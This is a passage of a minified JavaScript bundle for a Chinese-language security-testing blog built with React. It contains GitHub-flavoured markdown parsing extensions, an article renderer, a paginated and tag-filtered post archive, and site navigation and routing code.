r=e.length;for(;r--;)if(e[r][1].type==="labelImage"&&e[r][0]==="enter"){e[r][1];break}e[r+1][1].type="data",e[r+3][1].type="gfmFootnoteCallLabelMarker";const a={type:"gfmFootnoteCall",start:Object.assign({},e[r+3][1].start),end:Object.assign({},e[e.length-1][1].end)},o={type:"gfmFootnoteCallMarker",start:Object.assign({},e[r+3][1].end),end:Object.assign({},e[r+3][1].end)};o.end.column++,o.end.offset++,o.end._bufferIndex++;const s={type:"gfmFootnoteCallString",start:Object.assign({},o.end),end:Object.assign({},e[e.length-1][1].start)},l={type:"chunkString",contentType:"string",start:Object.assign({},s.start),end:Object.assign({},s.end)},h=[e[r+1],e[r+2],["enter",a,t],e[r+3],e[r+4],["enter",o,t],["exit",o,t],["enter",s,t],["enter",l,t],["exit",l,t],["exit",s,t],e[e.length-2],e[e.length-1],["exit",a,t]];return e.splice(r,e.length-r+1,...h),e}function JI(e,t,r){const a=this,o=a.parser.gfmFootnotes||(a.parser.gfmFootnotes=[]);let s=0,l;return h;function h(E){return e.enter("gfmFootnoteCall"),e.enter("gfmFootnoteCallLabelMarker"),e.consume(E),e.exit("gfmFootnoteCallLabelMarker"),p}function p(E){return E!==94?r(E):(e.enter("gfmFootnoteCallMarker"),e.consume(E),e.exit("gfmFootnoteCallMarker"),e.enter("gfmFootnoteCallString"),e.enter("chunkString").contentType="string",g)}function g(E){if(s>999||E===93&&!l||E===null||E===91||We(E))return r(E);if(E===93){e.exit("chunkString");const _=e.exit("gfmFootnoteCallString");return o.includes(sn(a.sliceSerialize(_)))?(e.enter("gfmFootnoteCallLabelMarker"),e.consume(E),e.exit("gfmFootnoteCallLabelMarker"),e.exit("gfmFootnoteCall"),t):r(E)}return We(E)||(l=!0),s++,e.consume(E),E===92?T:g}function T(E){return E===91||E===92||E===93?(e.consume(E),s++,g):g(E)}}function ZI(e,t,r){const a=this,o=a.parser.gfmFootnotes||(a.parser.gfmFootnotes=[]);let s,l=0,h;return p;function p(I){return e.enter("gfmFootnoteDefinition")._container=!0,e.enter("gfmFootnoteDefinitionLabel"),e.enter("gfmFootnoteDefinitionLabelMarker"),e.consume(I),e.exit("gfmFootnoteDefinitionLabelMarker"),g}function g(I){return I===94?(e.enter("gfmFootnoteDefinitionMarker"),e.consume(I),e.exit("gfmFootnoteDefinitionMarker"),e.enter("gfmFootnoteDefinitionLabelString"),e.enter("chunkString").contentType="string",T):r(I)}function T(I){if(l>999||I===93&&!h||I===null||I===91||We(I))return r(I);if(I===93){e.exit("chunkString");const F=e.exit("gfmFootnoteDefinitionLabelString");return s=sn(a.sliceSerialize(F)),e.enter("gfmFootnoteDefinitionLabelMarker"),e.consume(I),e.exit("gfmFootnoteDefinitionLabelMarker"),e.exit("gfmFootnoteDefinitionLabel"),_}return We(I)||(h=!0),l++,e.consume(I),I===92?E:T}function E(I){return I===91||I===92||I===93?(e.consume(I),l++,T):T(I)}function _(I){return I===58?(e.enter("definitionMarker"),e.consume(I),e.exit("definitionMarker"),o.includes(s)||o.push(s),De(e,S,"gfmFootnoteDefinitionWhitespace")):r(I)}function S(I){return t(I)}}function eN(e,t,r){return e.check(Ha,t,e.attempt(VI,t,r))}function tN(e){e.exit("gfmFootnoteDefinition")}function nN(e,t,r){const a=this;return De(e,o,"gfmFootnoteDefinitionIndent",5);function o(s){const l=a.events[a.events.length-1];return l&&l[1].type==="gfmFootnoteDefinitionIndent"&&l[2].sliceSerialize(l[1],!0).length===4?t(s):r(s)}}function rN(e){let r=(e||{}).singleTilde;const a={name:"strikethrough",tokenize:s,resolveAll:o};return r==null&&(r=!0),{text:{126:a},insideSpan:{null:[a]},attentionMarkers:{null:[126]}};function o(l,h){let p=-1;for(;++p<l.length;)if(l[p][0]==="enter"&&l[p][1].type==="strikethroughSequenceTemporary"&&l[p][1]._close){let g=p;for(;g--;)if(l[g][0]==="exit"&&l[g][1].type==="strikethroughSequenceTemporary"&&l[g][1]._open&&l[p][1].end.offset-l[p][1].start.offset===l[g][1].end.offset-l[g][1].start.offset){l[p][1].type="strikethroughSequence",l[g][1].type="strikethroughSequence";const T={type:"strikethrough",start:Object.assign({},l[g][1].start),end:Object.assign({},l[p][1].end)},E={type:"strikethroughText",start:Object.assign({},l[g][1].end),end:Object.assign({},l[p][1].start)},_=[["enter",T,h],["enter",l[g][1],h],["exit",l[g][1],h],["enter",E,h]],S=h.parser.constructs.insideSpan.null;S&&Wt(_,_.length,0,vo(S,l.slice(g+1,p),h)),Wt(_,_.length,0,[["exit",E,h],["enter",l[p][1],h],["exit",l[p][1],h],["exit",T,h]]),Wt(l,g-1,p-g+3,_),p=g+_.length-2;break}}for(p=-1;++p<l.length;)l[p][1].type==="strikethroughSequenceTemporary"&&(l[p][1].type="data");return l}function s(l,h,p){const g=this.previous,T=this.events;let E=0;return _;function _(I){return g===126&&T[T.length-1][1].type!=="characterEscape"?p(I):(l.enter("strikethroughSequenceTemporary"),S(I))}function S(I){const F=gi(g);if(I===126)return E>1?p(I):(l.consume(I),E++,S);if(E<2&&!r)return p(I);const P=l.exit("strikethroughSequenceTemporary"),w=gi(I);return P._open=!w||w===2&&!!F,P._close=!F||F===2&&!!w,h(I)}}}class iN{constructor(){this.map=[]}add(t,r,a){aN(this,t,r,a)}consume(t){if(this.map.sort(function(s,l){return s[0]-l[0]}),this.map.length===0)return;let r=this.map.length;const a=[];for(;r>0;)r-=1,a.push(t.slice(this.map[r][0]+this.map[r][1]),this.map[r][2]),t.length=this.map[r][0];a.push(t.slice()),t.length=0;let o=a.pop();for(;o;){for(const s of o)t.push(s);o=a.pop()}this.map.length=0}}function aN(e,t,r,a){let o=0;if(!(r===0&&a.length===0)){for(;o<e.map.length;){if(e.map[o][0]===t){e.map[o][1]+=r,e.map[o][2].push(...a);return}o+=1}e.map.push([t,r,a])}}function uN(e,t){let r=!1;const a=[];for(;t<e.length;){const o=e[t];if(r){if(o[0]==="enter")o[1].type==="tableContent"&&a.push(e[t+1][1].type==="tableDelimiterMarker"?"left":"none");else if(o[1].type==="tableContent"){if(e[t-1][1].type==="tableDelimiterMarker"){const s=a.length-1;a[s]=a[s]==="left"?"center":"right"}}else if(o[1].type==="tableDelimiterRow")break}else o[0]==="enter"&&o[1].type==="tableDelimiterRow"&&(r=!0);t+=1}return a}function oN(){return{flow:{null:{name:"table",tokenize:sN,resolveAll:lN}}}}function sN(e,t,r){const a=this;let o=0,s=0,l;return h;function h(H){let ue=a.events.length-1;for(;ue>-1;){const ce=a.events[ue][1].type;if(ce==="lineEnding"||ce==="linePrefix")ue--;else break}const oe=ue>-1?a.events[ue][1].type:null,Ae=oe==="tableHead"||oe==="tableRow"?z:p;return Ae===z&&a.parser.lazy[a.now().line]?r(H):Ae(H)}function p(H){return e.enter("tableHead"),e.enter("tableRow"),g(H)}function g(H){return H===124||(l=!0,s+=1),T(H)}function T(H){return H===null?r(H):Te(H)?s>1?(s=0,a.interrupt=!0,e.exit("tableRow"),e.enter("lineEnding"),e.consume(H),e.exit("lineEnding"),S):r(H):we(H)?De(e,T,"whitespace")(H):(s+=1,l&&(l=!1,o+=1),H===124?(e.enter("tableCellDivider"),e.consume(H),e.exit("tableCellDivider"),l=!0,T):(e.enter("data"),E(H)))}function E(H){return H===null||H===124||We(H)?(e.exit("data"),T(H)):(e.consume(H),H===92?_:E)}function _(H){return H===92||H===124?(e.consume(H),E):E(H)}function S(H){return a.interrupt=!1,a.parser.lazy[a.now().line]?r(H):(e.enter("tableDelimiterRow"),l=!1,we(H)?De(e,I,"linePrefix",a.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(H):I(H))}function I(H){return H===45||H===58?P(H):H===124?(l=!0,e.enter("tableCellDivider"),e.consume(H),e.exit("tableCellDivider"),F):de(H)}function F(H){return we(H)?De(e,P,"whitespace")(H):P(H)}function P(H){return H===58?(s+=1,l=!0,e.enter("tableDelimiterMarker"),e.consume(H),e.exit("tableDelimiterMarker"),w):H===45?(s+=1,w(H)):H===null||Te(H)?ie(H):de(H)}function w(H){return H===45?(e.enter("tableDelimiterFiller"),Q(H)):de(H)}function Q(H){return H===45?(e.consume(H),Q):H===58?(l=!0,e.exit("tableDelimiterFiller"),e.enter("tableDelimiterMarker"),e.consume(H),e.exit("tableDelimiterMarker"),j):(e.exit("tableDelimiterFiller"),j(H))}function j(H){return we(H)?De(e,ie,"whitespace")(H):ie(H)}function ie(H){return H===124?I(H):H===null||Te(H)?!l||o!==s?de(H):(e.exit("tableDelimiterRow"),e.exit("tableHead"),t(H)):de(H)}function de(H){return r(H)}function z(H){return e.enter("tableRow"),me(H)}function me(H){return H===124?(e.enter("tableCellDivider"),e.consume(H),e.exit("tableCellDivider"),me):H===null||Te(H)?(e.exit("tableRow"),t(H)):we(H)?De(e,me,"whitespace")(H):(e.enter("data"),Se(H))}function Se(H){return H===null||H===124||We(H)?(e.exit("data"),me(H)):(e.consume(H),H===92?xe:Se)}function xe(H){return H===92||H===124?(e.consume(H),Se):Se(H)}}function lN(e,t){let r=-1,a=!0,o=0,s=[0,0,0,0],l=[0,0,0,0],h=!1,p=0,g,T,E;const _=new iN;for(;++r<e.length;){const S=e[r],I=S[1];S[0]==="enter"?I.type==="tableHead"?(h=!1,p!==0&&(tp(_,t,p,g,T),T=void 0,p=0),g={type:"table",start:Object.assign({},I.start),end:Object.assign({},I.end)},_.add(r,0,[["enter",g,t]])):I.type==="tableRow"||I.type==="tableDelimiterRow"?(a=!0,E=void 0,s=[0,0,0,0],l=[0,r+1,0,0],h&&(h=!1,T={type:"tableBody",start:Object.assign({},I.start),end:Object.assign({},I.end)},_.add(r,0,[["enter",T,t]])),o=I.type==="tableDelimiterRow"?2:T?3:1):o&&(I.type==="data"||I.type==="tableDelimiterMarker"||I.type==="tableDelimiterFiller")?(a=!1,l[2]===0&&(s[1]!==0&&(l[0]=l[1],E=oo(_,t,s,o,void 0,E),s=[0,0,0,0]),l[2]=r)):I.type==="tableCellDivider"&&(a?a=!1:(s[1]!==0&&(l[0]=l[1],E=oo(_,t,s,o,void 0,E)),s=l,l=[s[1],r,0,0])):I.type==="tableHead"?(h=!0,p=r):I.type==="tableRow"||I.type==="tableDelimiterRow"?(p=r,s[1]!==0?(l[0]=l[1],E=oo(_,t,s,o,r,E)):l[1]!==0&&(E=oo(_,t,l,o,r,E)),o=0):o&&(I.type==="data"||I.type==="tableDelimiterMarker"||I.type==="tableDelimiterFiller")&&(l[3]=r)}for(p!==0&&tp(_,t,p,g,T),_.consume(t.events),r=-1;++r<t.events.length;){const S=t.events[r];S[0]==="enter"&&S[1].type==="table"&&(S[1]._align=uN(t.events,r))}return e}function oo(e,t,r,a,o,s){const l=a===1?"tableHeader":a===2?"tableDelimiter":"tableData",h="tableContent";r[0]!==0&&(s.end=Object.assign({},ci(t.events,r[0])),e.add(r[0],0,[["exit",s,t]]));const p=ci(t.events,r[1]);if(s={type:l,start:Object.assign({},p),end:Object.assign({},p)},e.add(r[1],0,[["enter",s,t]]),r[2]!==0){const g=ci(t.events,r[2]),T=ci(t.events,r[3]),E={type:h,start:Object.assign({},g),end:Object.assign({},T)};if(e.add(r[2],0,[["enter",E,t]]),a!==2){const _=t.events[r[2]],S=t.events[r[3]];if(_[1].end=Object.assign({},S[1].end),_[1].type="chunkText",_[1].contentType="text",r[3]>r[2]+1){const I=r[2]+1,F=r[3]-r[2]-1;e.add(I,F,[])}}e.add(r[3]+1,0,[["exit",E,t]])}return o!==void 0&&(s.end=Object.assign({},ci(t.events,o)),e.add(o,0,[["exit",s,t]]),s=void 0),s}function tp(e,t,r,a,o){const s=[],l=ci(t.events,r);o&&(o.end=Object.assign({},l),s.push(["exit",o,t])),a.end=Object.assign({},l),s.push(["exit",a,t]),e.add(r+1,0,s)}function ci(e,t){const r=e[t],a=r[0]==="enter"?"start":"end";return r[1][a]}const cN={name:"tasklistCheck",tokenize:fN};function dN(){return{text:{91:cN}}}function fN(e,t,r){const a=this;return o;function o(p){return a.previous!==null||!a._gfmTasklistFirstContentOfListItem?r(p):(e.enter("taskListCheck"),e.enter("taskListCheckMarker"),e.consume(p),e.exit("taskListCheckMarker"),s)}function s(p){return We(p)?(e.enter("taskListCheckValueUnchecked"),e.consume(p),e.exit("taskListCheckValueUnchecked"),l):p===88||p===120?(e.enter("taskListCheckValueChecked"),e.consume(p),e.exit("taskListCheckValueChecked"),l):r(p)}function l(p){return p===93?(e.enter("taskListCheckMarker"),e.consume(p),e.exit("taskListCheckMarker"),e.exit("taskListCheck"),h):r(p)}function h(p){return Te(p)?t(p):we(p)?e.check({tokenize:hN},t,r)(p):r(p)}}function hN(e,t,r){return De(e,a,"whitespace");function a(o){return o===null?r(o):t(o)}}function pN(e){return Up([HI(),$I(),rN(e),oN(),dN()])}const mN={};function gN(e){const t=this,r=e||mN,a=t.data(),o=a.micromarkExtensions||(a.micromarkExtensions=[]),s=a.fromMarkdownExtensions||(a.fromMarkdownExtensions=[]),l=a.toMarkdownExtensions||(a.toMarkdownExtensions=[]);o.push(pN(r)),s.push(DI()),l.push(MI(r))}function np(e){return e.trim().replace(/^<(.+)>$/,"$1")}function EN(e,t=()=>{}){const r={a({href:a,children:o,...s}){const l=a?np(a):void 0,h=l?/^(https?:)?\/\//.test(l):!1;return v.jsx("a",{...s,href:l,target:h?"_blank":void 0,rel:h?"noreferrer":void 0,children:o})},img({src:a,alt:o,...s}){const l=a?np(a):"";return v.jsx("img",{...s,src:t(l)??l,alt:o??"",loading:"lazy"})},pre({children:a,...o}){return v.jsx("pre",{...o,className:"article-code",children:a})},table({children:a,...o}){return v.jsx("div",{className:"article-table-scroll",children:v.jsx("table",{...o,children:a})})}};return v.jsx(Y3,{remarkPlugins:[gN],rehypePlugins:[ok],components:r,children:e})}function TN(){const{slug:e}=YE(),t=D_(e);if(!t)return v.jsx("section",{className:"page-section",children:v.jsxs(Jt,{className:"empty-state",children:[v.jsx("h1",{children:"没有找到这篇文章"}),v.jsx("p",{children:"它可能已经被移动，或者链接里有一个拼写错误。"}),v.jsx(vr,{to:"/posts",children:v.jsx(va,{type:"primary",children:"返回文章列表"})})]})});const r=t.sourcePath.slice(0,t.sourcePath.lastIndexOf("/")),a=o=>{if(/^(https?:|data:|\/)/.test(o))return o;const s=o.replace(/^\.\//,"");return k_[`${r}/${s}`]};return v.jsxs("article",{className:"article-page",children:[v.jsxs("header",{className:"article-hero",children:[v.jsx(vr,{to:"/posts",className:"back-link",children:"返回文章"}),v.jsxs("div",{className:"article-meta",children:[v.jsx("span",{children:Cp(t.date)}),v.jsx("span",{children:t.readingTime})]}),v.jsx("h1",{children:t.title}),v.jsx("p",{children:t.summary}),v.jsx("div",{className:"tag-row",children:t.tags.map(o=>v.jsx("span",{className:"tag",children:o},o))})]}),v.jsx(Ma,{}),v.jsx(Jt,{className:"article-card",children:v.jsx("div",{className:"article-content",children:EN(t.content,a)})})]})}const rp=Array.from(new Set(mi.map(e=>e.category).filter(e=>!!e))),bN=[...rp,...Array.from(new Set(mi.flatMap(e=>e.tags).filter(e=>!rp.includes(e))))],so=8;function ip(e,t){return!Number.isFinite(e)||e<1?1:Math.min(e,t)}function _N(e,t){if(t<=5)return Array.from({length:t},(a,o)=>o+1);const r=Math.max(1,Math.min(e-2,t-4));return Array.from({length:5},(a,o)=>r+o)}function SN(){const[e,t]=ST(),r=e.get("tag")??"",a=Number(e.get("page")??"1"),o=r?mi.filter(_=>_.tags.includes(r)):mi,s=Math.max(1,Math.ceil(o.length/so)),l=ip(a,s),h=(l-1)*so,p=o.slice(h,h+so),g=_N(l,s),T=_=>{const S=new URLSearchParams;_&&S.set("tag",_),t(S)},E=_=>{const S=ip(_,s),I=new URLSearchParams;r&&I.set("tag",r),S>1&&I.set("page",String(S)),t(I)};return v.jsxs("section",{className:"page-section",children:[v.jsxs("div",{className:"page-title",children:[v.jsx("span",{className:"eyebrow",children:"Archive"}),v.jsx("h1",{children:"文章"}),v.jsx("p",{children:"按时间整理的安全测试与防护实践记录，所有文章都来自本地 Markdown 文件。"})]}),v.jsxs(Jt,{className:"tag-panel",children:[v.jsx("strong",{children:"主题标签"}),v.jsxs("div",{className:"tag-row",children:[v.jsx("button",{className:`tag tag-button ${r?"":"tag-active"}`,type:"button",onClick:()=>T(""),children:"全部"}),bN.map(_=>v.jsx("button",{className:`tag tag-button ${r===_?"tag-active":"tag-soft"}`,type:"button",onClick:()=>T(_),children:_},_))]})]}),v.jsx(Ma,{}),v.jsxs("div",{className:"archive-summary",children:[v.jsx("strong",{children:r||"全部文章"}),v.jsxs("span",{children:["共 ",o.length," 篇，第 ",l," / ",s," 页"]})]}),p.length>0?v.jsx("div",{className:"post-list",children:p.map(_=>v.jsx(xp,{post:_,compact:!0},_.slug))}):v.jsxs(Jt,{className:"empty-state",children:[v.jsx("h2",{children:"没有匹配的文章"}),v.jsx("p",{children:"当前标签下还没有内容，可以回到全部文章继续浏览。"}),v.jsx("button",{className:"pagination-button pagination-button-primary",type:"button",onClick:()=>T(""),children:"查看全部文章"})]}),o.length>so&&v.jsxs("nav",{className:"pagination","aria-label":"文章分页",children:[v.jsx("button",{className:"pagination-button",type:"button",disabled:l===1,onClick:()=>E(1),children:"首页"}),v.jsx("button",{className:"pagination-button",type:"button",disabled:l===1,onClick:()=>E(l-1),children:"上一页"}),g.map(_=>v.jsx("button",{className:`pagination-button ${l===_?"pagination-button-primary":""}`,type:"button","aria-current":l===_?"page":void 0,onClick:()=>E(_),children:_},_)),v.jsx("button",{className:"pagination-button",type:"button",disabled:l===s,onClick:()=>E(l+1),children:"下一页"}),v.jsx("button",{className:"pagination-button",type:"button",disabled:l===s,onClick:()=>E(s),children:"末页"})]})]})}const yN=[{to:"/",label:"首页"},{to:"/posts",label:"文章"},{to:"/about",label:"关于"}];function CN(){return v.jsxs("div",{className:"app-shell",children:[v.jsxs("header",{className:"site-header",children:[v.jsxs(U0,{to:"/",className:"brand","aria-label":"返回首页",children:[v.jsx("span",{className:"brand-mark",children:v.jsx(Ir,{name:"icon-map"})}),v.jsxs("span",{children:[v.jsx("strong",{children:"云飞"}),v.jsx("small",{children:"安全测试日志"})]})]}),v.jsx("nav",{className:"site-nav","aria-label":"主导航",children:yN.map(e=>v.jsx(U0,{to:e.to,className:({isActive:t})=>t?"nav-link nav-link-active":"nav-link",end:e.to==="/",children:e.label},e.to))}),v.jsx(vr,{className:"header-action",to:"/posts",children:v.jsx(va,{type:"primary",size:"small",children:"开始阅读"})})]}),v.jsx("main",{children:v.jsxs(oT,{children:[v.jsx(Ta,{path:"/",element:v.jsx(F_,{})}),v.jsx(Ta,{path:"/posts",element:v.jsx(SN,{})}),v.jsx(Ta,{path:"/posts/:slug",element:v.jsx(TN,{})}),v.jsx(Ta,{path:"/about",element:v.jsx(Cb,{})})]})}),v.jsx(Sp,{type:"sea"})]})}gE.createRoot(document.getElementById("root")).render(v.jsx(fi.StrictMode,{children:v.jsx(gT,{future:{v7_relativeSplatPath:!0,v7_startTransition:!0},children:v.jsx(bp,{children:v.jsx(CN,{})})})}));
